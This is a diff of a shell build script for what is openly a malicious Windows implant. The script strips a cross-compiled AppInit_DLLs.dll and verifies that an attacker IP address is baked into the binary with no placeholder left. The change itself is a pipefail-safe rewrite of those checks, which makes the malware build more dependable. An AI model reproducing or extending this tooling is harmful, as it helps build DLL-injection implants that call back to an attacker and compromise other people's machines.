@@ -40,12 +40,12 @@ echo "BUILD_EXIT=0"
 x86_64-w64-mingw32-strip -s AppInit_DLLs.dll   # drop debug sections from the static archives
 
 # Post-build proof: the IP is embedded and the placeholder is GONE.
-if ! strings AppInit_DLLs.dll | grep -qx "$ATTACKER_IP"; then
-    echo "FATAL: $ATTACKER_IP not found embedded in the binary"; exit 1
-fi
-if strings AppInit_DLLs.dll | grep -qx "ATTACKER_IP"; then
-    echo "FATAL: unsubstituted placeholder survived into the binary"; exit 1
-fi
+# NOTE: never use `grep -q` under pipefail — -q exits early, SIGPIPEs strings,
+# and pipefail turns a successful match into a failed pipeline. Count instead.
+HAS_IP=$(strings AppInit_DLLs.dll | grep -cx "$ATTACKER_IP" || true)
+[ "${HAS_IP:-0}" -ge 1 ] || { echo "FATAL: $ATTACKER_IP not found embedded in the binary"; exit 1; }
+HAS_PH=$(strings AppInit_DLLs.dll | grep -cx "ATTACKER_IP" || true)
+[ "${HAS_PH:-0}" -eq 0 ] || { echo "FATAL: unsubstituted placeholder survived into the binary"; exit 1; }
 echo "verified: embedded host = $ATTACKER_IP, no placeholder residue"
 
 ls -lh AppInit_DLLs.dll
